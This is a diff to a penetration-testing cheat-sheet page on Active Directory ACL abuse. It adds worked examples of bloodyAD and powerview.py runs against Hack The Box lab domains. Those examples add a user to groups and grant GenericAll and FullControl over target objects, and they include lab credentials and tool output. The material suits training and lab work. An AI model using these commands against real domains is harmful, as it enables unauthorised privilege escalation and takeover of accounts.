@@ -338,27 +338,72 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-add-self-to-group">1. Add self to group</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
-</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; add groupMember &lt;GROUP&gt; &#39;&lt;USER&gt;&#39;
+</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; add groupMember &#39;&lt;GROUP&gt;&#39; &#39;&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d rebound.htb -u <span class="s1">&#39;oorend&#39;</span> -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> --host 10.10.11.231 add groupMember SERVICEMGMT <span class="s1">&#39;oorend&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">[+] oorend added to SERVICEMGMT
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With Kerberos
-</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -k --host &lt;DC&gt; add groupMember &lt;GROUP&gt; &#39;&lt;USER&gt;&#39;
+</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -k --host &lt;DC&gt; add groupMember &#39;&lt;GROUP&gt;&#39; &#39;&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d absolute.htb -u <span class="s1">&#39;m.lovegod&#39;</span> -p <span class="s1">&#39;AbsoluteLDAP2022!&#39;</span> -k --host dc.absolute.htb add groupMember <span class="s1">&#39;NETWORK AUDIT&#39;</span> <span class="s1">&#39;m.lovegod&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">[+] m.lovegod added to NETWORK AUDIT
 </span></span></span></code></pre></div><h4 id="2-add-genericall-over-target-group">2. Add genericAll over target group</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
 </span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; add genericAll &#39;OU=&lt;TARGET_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; &#39;&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d rebound.htb -u <span class="s1">&#39;oorend&#39;</span> -p <span class="s1">&#39;1GR8t@$$4u&#39;</span> --host 10.10.11.231 add genericAll <span class="s1">&#39;OU=SERVICE USERS,DC=REBOUND,DC=HTB&#39;</span> <span class="s1">&#39;oorend&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With Kerberos
-</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -k --host &lt;DC&gt; add genericAll &#39;OU=&lt;TARGET_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; &#39;&lt;USER&gt;&#39;
+</span></span><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -k --host &lt;DC&gt; add genericAll &#39;OU=&lt;TARGET_GROUP&gt;,DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; &#39;&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d absolute.htb -u <span class="s1">&#39;m.lovegod&#39;</span> -p <span class="s1">&#39;AbsoluteLDAP2022!&#39;</span> -k --host dc.absolute.htb add genericAll <span class="s1">&#39;NETWORK AUDIT&#39;</span> <span class="s1">&#39;m.lovegod&#39;</span> 
+</span></span><span class="line"><span class="cl"><span class="go">[+] m.lovegod has now GenericAll on NETWORK AUDIT
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></em></small></p></div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-connect">1. Connect</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; powerview &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET_DOMAIN&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc01.rebound.htb <span class="o">&amp;&amp;</span> powerview <span class="s1">&#39;rebound.htb/oorend:1GR8t@$$4u@dc01.rebound.htb&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">Logging directory is set to /home/kali/.powerview/logs/dc01.rebound.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:11:06] Channel binding is enforced!
+</span></span></span><span class="line"><span class="cl"><span class="go">(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
+</span></span></span><span class="line"><span class="cl"><span class="go">PV &gt; 
 </span></span></span></code></pre></div><h4 id="2-add-self-to-group">2. Add self to group</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity &lt;GROUP&gt; -Members &#39;&lt;USER&gt;&#39;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Add-DomainGroupMember -Identity &#39;&lt;GROUP&gt;&#39; -Members &#39;&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PV &gt; Add-DomainGroupMember -Identity &#39;servicemgmt&#39; -Members &#39;oorend&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:13:17] User oorend successfully added to servicemgmt
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
-</span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity &lt;GROUP&gt;
+</span></span><span class="line"><span class="cl"><span class="go">Get-DomainGroupMember -Identity &#39;&lt;GROUP&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PV &gt; Get-DomainGroupMember -Identity &#39;servicemgmt&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">GroupDomainName             : ServiceMgmt
+</span></span></span><span class="line"><span class="cl"><span class="go">GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
+</span></span></span><span class="line"><span class="cl"><span class="go">MemberDomain                : rebound.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">MemberName                  : ppaul
+</span></span></span><span class="line"><span class="cl"><span class="go">MemberDistinguishedName     : CN=ppaul,CN=Users,DC=rebound,DC=htb
+</span></span></span><span class="line"><span class="cl"><span class="go">MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">GroupDomainName             : ServiceMgmt
+</span></span></span><span class="line"><span class="cl"><span class="go">GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
+</span></span></span><span class="line"><span class="cl"><span class="go">MemberDomain                : rebound.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">MemberName                  : oorend
+</span></span></span><span class="line"><span class="cl"><span class="go">MemberDistinguishedName     : CN=oorend,CN=Users,DC=rebound,DC=htb
+</span></span></span><span class="line"><span class="cl"><span class="go">MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
 </span></span></span></code></pre></div><h4 id="4-add-fullcontrol-over-target-group">4. Add fullcontrol over target group</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Exit and login again to apply changes
-</span></span><span class="line"><span class="cl"><span class="go">Add-DomainObjectAcl -TargetIdentity &lt;TARGET_GROUP&gt; -PrincipalIdentity &#39;&lt;USER&gt;&#39; -Rights fullcontrol
+</span></span><span class="line"><span class="cl"><span class="go">Add-DomainObjectAcl -TargetIdentity &#39;&lt;TARGET_GROUP&gt;&#39; -PrincipalIdentity &#39;&lt;USER&gt;&#39; -Rights fullcontrol
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PV &gt; Add-DomainObjectAcl -TargetIdentity &#39;service users&#39; -PrincipalIdentity &#39;oorend&#39; -Rights fullcontrol
+</span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:37:24] [Add-DomainObjectACL] Found target identity: OU=Service Users,DC=rebound,DC=htb
+</span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:37:24] [Add-DomainObjectACL] Found principal identity: CN=oorend,CN=Users,DC=rebound,DC=htb
+</span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:37:24] Adding FullControl to OU=Service Users,DC=rebound,DC=htb
+</span></span></span><span class="line"><span class="cl"><span class="go">[2024-09-24 07:37:24] DACL modified successfully!
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check
-</span></span><span class="line"><span class="cl"><span class="go">Get-DomainObjectAcl -Identity &lt;TARGET_USER&gt; -Where &#39;SecurityIdentifier contains &lt;USER&gt;&#39;
+</span></span><span class="line"><span class="cl"><span class="go">Get-DomainObjectAcl -Identity &#39;&lt;TARGET_USER&gt;&#39; -Where &#39;SecurityIdentifier contains &lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PV &gt; Get-DomainObjectAcl -Identity &#39;winrm_svc&#39; -Where &#39;SecurityIdentifier contains oorend&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">ObjectDN                    : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
+</span></span></span><span class="line"><span class="cl"><span class="go">ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7684
+</span></span></span><span class="line"><span class="cl"><span class="go">ACEType                     : ACCESS_ALLOWED_ACE
+</span></span></span><span class="line"><span class="cl"><span class="go">ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
+</span></span></span><span class="line"><span class="cl"><span class="go">ActiveDirectoryRights       : FullControl
+</span></span></span><span class="line"><span class="cl"><span class="go">AccessMask                  : 0xf01ff
+</span></span></span><span class="line"><span class="cl"><span class="go">InheritanceType             : None
+</span></span></span><span class="line"><span class="cl"><span class="go">SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/aniqfakhrul/powerview.py">powerview.py</a></em></small></p></div></p>
 
 </div></div>
